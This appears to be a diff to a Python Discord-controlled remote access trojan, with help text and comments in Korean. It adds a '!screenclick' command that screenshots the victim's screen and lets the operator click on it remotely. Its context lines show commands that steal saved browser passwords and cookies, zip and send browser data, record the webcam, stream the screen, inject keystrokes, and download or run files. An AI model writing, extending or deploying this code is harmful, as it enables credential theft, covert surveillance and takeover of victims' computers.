@@ -791,7 +791,8 @@ def get_embed(page: str):
             "`!paint <텍스트>` - 그림판 열고 텍스트 및 사각형 그리기\n"
             "`!passwords` - 브라우저 저장 비밀번호 탈취\n"
             "`!cookies` - 브라우저 쿠키 탈취 (복호화 개선됨)\n"
-            "`!browserdump` - 브라우저 전체 데이터 (ZIP)"
+            "`!browserdump` - 브라우저 전체 데이터 (ZIP)\n"
+            "`!screenclick [격자크기]` - 스크린샷 캡처 후 격자 버튼으로 클릭 위치 선택"
         )
 
     elif page == "destructive":
@@ -851,6 +852,90 @@ class HelpView(discord.ui.View):
 @bot.command()
 async def help(ctx):
     await ctx.send(embed=get_embed("main"), view=HelpView())
+
+# ---------- SCREEN CLICK GRID UI ----------
+class ClickGridView(discord.ui.View):
+    def __init__(self, grid_size, screen_width, screen_height, timeout=300):
+        super().__init__(timeout=timeout)
+        self.grid_size = min(grid_size, 5)  # 최대 5x5 (Discord 버튼 제한)
+        self.screen_width = screen_width
+        self.screen_height = screen_height
+        self.add_buttons()
+
+    def add_buttons(self):
+        for row in range(self.grid_size):
+            for col in range(self.grid_size):
+                label = f"{row+1},{col+1}"
+                custom_id = f"click_{row}_{col}"
+                button = discord.ui.Button(label=label, custom_id=custom_id)
+                button.callback = self.button_callback
+                self.add_item(button)
+
+    async def button_callback(self, interaction: discord.Interaction):
+        custom_id = interaction.data["custom_id"]
+        parts = custom_id.split('_')
+        if len(parts) != 3:
+            await interaction.response.send_message("잘못된 버튼입니다.", ephemeral=True)
+            return
+        _, row_str, col_str = parts
+        try:
+            row = int(row_str)
+            col = int(col_str)
+        except ValueError:
+            await interaction.response.send_message("잘못된 버튼 데이터입니다.", ephemeral=True)
+            return
+
+        cell_width = self.screen_width // self.grid_size
+        cell_height = self.screen_height // self.grid_size
+        center_x = col * cell_width + cell_width // 2
+        center_y = row * cell_height + cell_height // 2
+
+        try:
+            pyautogui.moveTo(center_x, center_y)
+            pyautogui.click()
+            await interaction.response.send_message(
+                f"🖱️ 클릭 완료! 위치: ({center_x}, {center_y})",
+                ephemeral=True
+            )
+        except Exception as e:
+            await interaction.response.send_message(
+                f"❌ 클릭 실패: {str(e)}",
+                ephemeral=True
+            )
+
+@bot.command(name="screenclick")
+async def screenclick(ctx, grid_size: int = 3):
+    """
+    스크린샷을 찍고 격자 버튼을 제공하여 클릭할 위치를 선택할 수 있습니다.
+    사용법: !screenclick [격자크기] (기본 3, 최대 5)
+    """
+    if grid_size < 1:
+        grid_size = 1
+    elif grid_size > 5:
+        grid_size = 5
+
+    temp_path = os.path.join(os.getenv('TEMP'), 'screenclick.png')
+    try:
+        with mss() as sct:
+            sct.shot(output=temp_path)
+    except Exception as e:
+        await ctx.send(embed=ch3at_embed(f"❌ 스크린샷 캡처 실패: {str(e)}", color=0xff0000))
+        return
+
+    screen_width, screen_height = pyautogui.size()
+    view = ClickGridView(grid_size, screen_width, screen_height)
+
+    file = discord.File(temp_path, filename="screenclick.png")
+    embed = ch3at_embed(
+        f"🖱️ **화면 클릭 인터페이스**\n격자 {grid_size}x{grid_size}, 각 칸을 클릭하면 해당 중앙으로 마우스가 이동 후 클릭합니다.",
+        color=0x00ff00
+    )
+    await ctx.send(embed=embed, file=file, view=view)
+
+    try:
+        os.remove(temp_path)
+    except:
+        pass
 
 # ---------- BROWSER STEALER FUNCTIONS ----------
 
@@ -1067,7 +1152,6 @@ def steal_browser_passwords():
 # ---------- MOUSE ART & PAINT ----------
 
 def mouse_art(shape, duration=10.0, speed=0.01):
-    """shape: 원, 사각형, 삼각형, duration: 초, speed: step 간격 (초)"""
     start_time = time.time()
     sw, sh = pyautogui.size()
     center_x, center_y = sw//2, sh//2
@@ -1424,7 +1508,6 @@ async def on_message(message):
         except:
             await message.channel.send(embed=ch3at_embed("명령어 실패.", color=0xff0000))
 
-    # ---------- !passwords ----------
     if message.content == "!passwords":
         await message.channel.send(embed=ch3at_embed("🔑 **비밀번호 탈취:** 브라우저 저장 로그인 정보를 수집 중..."))
         result = steal_browser_passwords()
@@ -1438,7 +1521,6 @@ async def on_message(message):
         else:
             await message.channel.send(embed=ch3at_embed(f"🔑 **비밀번호 목록:**\n```\n{result}\n```"))
 
-    # ---------- !cookies ----------
     if message.content == "!cookies":
         await message.channel.send(embed=ch3at_embed("🍪 **쿠키 수집 중... (개선된 복호화 적용)**"))
         data = steal_all_browser_data()
@@ -1457,7 +1539,6 @@ async def on_message(message):
         else:
             await message.channel.send(embed=ch3at_embed(f"🍪 **쿠키 목록:**\n```\n{cookies_text}\n```"))
 
-    # ---------- !browserdump ----------
     if message.content == "!browserdump":
         await message.channel.send(embed=ch3at_embed("📦 **전체 브라우저 데이터 수집 중... (시간 소요)**"))
         data = steal_all_browser_data()
@@ -1469,7 +1550,6 @@ async def on_message(message):
         await message.channel.send(embed=ch3at_embed("✅ **브라우저 덤프 완료** - ZIP 파일 확인"), file=file)
         os.remove(zip_path)
 
-    # ---------- !site ----------
     if message.content.startswith("!site "):
         url = message.content[6:].strip()
         if not url.startswith(("http://", "https://")):
@@ -1480,7 +1560,6 @@ async def on_message(message):
         except Exception as e:
             await message.channel.send(embed=ch3at_embed(f"사이트 열기 실패: `{str(e)}`", color=0xff0000))
 
-    # ---------- !webcamrecord ----------
     if message.content.startswith("!webcamrecord "):
         if not CV2_AVAILABLE:
             await message.channel.send(embed=ch3at_embed("❌ OpenCV가 설치되지 않았습니다. `pip install opencv-python`", color=0xff0000))
@@ -1513,7 +1592,6 @@ async def on_message(message):
             except Exception as e:
                 await message.channel.send(embed=ch3at_embed(f"웹캠 녹화 실패: `{str(e)}`", color=0xff0000))
 
-    # ---------- !stream ----------
     if message.content.startswith("!stream "):
         global stream_running, stream_thread, stream_stop_event, stream_channel
         args = message.content[8:].strip().lower()
@@ -1538,7 +1616,6 @@ async def on_message(message):
         else:
             await message.channel.send(embed=ch3at_embed("구문: `!stream start` 또는 `!stream stop`", color=0xff0000))
 
-    # ---------- !text ----------
     if message.content.startswith("!text "):
         parts = message.content[6:].strip().split(" ")
         if len(parts) == 0:
@@ -1562,7 +1639,6 @@ async def on_message(message):
             threading.Thread(target=show_popup, daemon=True).start()
             await message.channel.send(embed=ch3at_embed(f"💬 **팝업 표시:** '{text}' - {duration}초 후 자동 닫힘."))
 
-    # ---------- !ps ----------
     if message.content == "!ps":
         try:
             result = subprocess.run(["tasklist"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
@@ -1579,7 +1655,6 @@ async def on_message(message):
         except Exception as e:
             await message.channel.send(embed=ch3at_embed(f"프로세스 목록 실패: `{str(e)}`", color=0xff0000))
 
-    # ---------- !click ----------
     if message.content.startswith("!click"):
         args = message.content[6:].strip().split()
         button = "left"
@@ -1600,7 +1675,6 @@ async def on_message(message):
             pyautogui.middleClick(clicks=count)
         await message.channel.send(embed=ch3at_embed(f"🖱️ **클릭:** {button} 버튼 {count}회"))
 
-    # ---------- !clickpos ----------
     if message.content.startswith("!clickpos"):
         args = message.content[10:].strip().split()
         if len(args) < 2:
@@ -1623,7 +1697,6 @@ async def on_message(message):
             except ValueError:
                 await message.channel.send(embed=ch3at_embed("좌표는 숫자여야 합니다.", color=0xff0000))
 
-    # ---------- !move ----------
     if message.content.startswith("!move"):
         args = message.content[6:].strip().split()
         if len(args) < 2:
@@ -1637,7 +1710,6 @@ async def on_message(message):
             except ValueError:
                 await message.channel.send(embed=ch3at_embed("좌표는 숫자여야 합니다.", color=0xff0000))
 
-    # ---------- !keypress ----------
     if message.content.startswith("!keypress "):
         key = message.content[10:].strip()
         if key:
@@ -1661,7 +1733,6 @@ async def on_message(message):
             except Exception as e:
                 await message.channel.send(embed=ch3at_embed(f"키 입력 실패: `{str(e)}`", color=0xff0000))
 
-    # ---------- !type ----------
     if message.content.startswith("!type "):
         text = message.content[6:].strip()
         if text:
@@ -1671,12 +1742,10 @@ async def on_message(message):
             except Exception as e:
                 await message.channel.send(embed=ch3at_embed(f"타이핑 실패: `{str(e)}`", color=0xff0000))
 
-    # ---------- !mousepos ----------
     if message.content == "!mousepos":
         x, y = pyautogui.position()
         await message.channel.send(embed=ch3at_embed(f"🖱️ **마우스 위치:** X={x}, Y={y}"))
 
-    # ---------- !mouseart ----------
     if message.content.startswith("!mouseart"):
         args = message.content[10:].strip().split()
         if len(args) == 0:
@@ -1693,7 +1762,6 @@ async def on_message(message):
                         speed = float(args[2])
                         if speed < 0.001: speed = 0.001
                 except ValueError:
-                    # speed given as second arg
                     try:
                         speed = float(args[1])
                         if speed < 0.001: speed = 0.001
@@ -1705,7 +1773,6 @@ async def on_message(message):
                 await message.channel.send(embed=ch3at_embed(f"🎨 **마우스 아트:** {shape} - {duration}초, 속도 {speed}초/스텝"))
                 threading.Thread(target=mouse_art, args=(shape, duration, speed), daemon=True).start()
 
-    # ---------- !paint ----------
     if message.content.startswith("!paint"):
         text = message.content[7:].strip()
         if not text:
@@ -1714,7 +1781,6 @@ async def on_message(message):
             await message.channel.send(embed=ch3at_embed(f"🎨 **그림판 실행:** '{text}' 입력 및 사각형 그리기"))
             threading.Thread(target=open_paint_and_draw, args=(text,), daemon=True).start()
 
-    # ---------- !crazymouse ----------
     if message.content.startswith("!crazymouse"):
         args = message.content[12:].strip().split()
         duration = 10.0
@@ -1745,7 +1811,6 @@ async def on_message(message):
                 time.sleep(1.0 / moves_per_sec)
         threading.Thread(target=crazy, daemon=True).start()
 
-    # ---------- !earthquake ----------
     if message.content.startswith("!earthquake"):
         args = message.content[12:].strip().split()
         duration = 10.0
@@ -1785,7 +1850,6 @@ async def on_message(message):
                 time.sleep(0.04)
         threading.Thread(target=shake, daemon=True).start()
 
-    # ---------- !run ----------
     if message.content.startswith("!run "):
         filepath = message.content[5:].strip()
         if os.path.exists(filepath):
@@ -1797,7 +1861,6 @@ async def on_message(message):
         else:
             await message.channel.send(embed=ch3at_embed(f"❌ 파일을 찾을 수 없음: `{filepath}`", color=0xff0000))
 
-    # ---------- !downloadurl (URL 다운로드) ----------
     if message.content.startswith("!downloadurl "):
         url = message.content[13:].strip()
         if not url.startswith(("http://", "https://")):
@@ -1819,7 +1882,6 @@ async def on_message(message):
             except Exception as e:
                 await message.channel.send(embed=ch3at_embed(f"❌ 다운로드 오류: `{str(e)}`", color=0xff0000))
 
-    # ---------- 기존 나머지 기능들 ----------
     if message.content.startswith("!message"):
         MB_YESNO = 0x04
         MB_HELP = 0x4000
